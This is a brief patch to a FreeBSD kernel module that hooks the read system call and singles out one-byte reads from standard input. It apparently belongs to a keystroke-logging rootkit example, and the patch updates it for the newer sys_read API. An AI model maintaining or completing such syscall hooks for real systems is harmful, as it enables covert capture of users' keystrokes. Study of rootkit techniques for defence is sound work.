@@ -55,9 +55,9 @@ read_hook(struct thread *td, void *syscall_args)
 
 	int error;
 	char buf[1];
-	int done;
+	size_t done;
 
-	error = read(td, syscall_args);
+	error = sys_read(td, syscall_args);
 
 	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
 		return(error);
@@ -82,7 +82,7 @@ load(struct module *module, int cmd, void *arg)
 
 	case MOD_UNLOAD:
 		/* Change everything back to normal. */
-		sysent[SYS_read].sy_call = (sy_call_t *)read;
+		sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
 		break;
 
 	default:
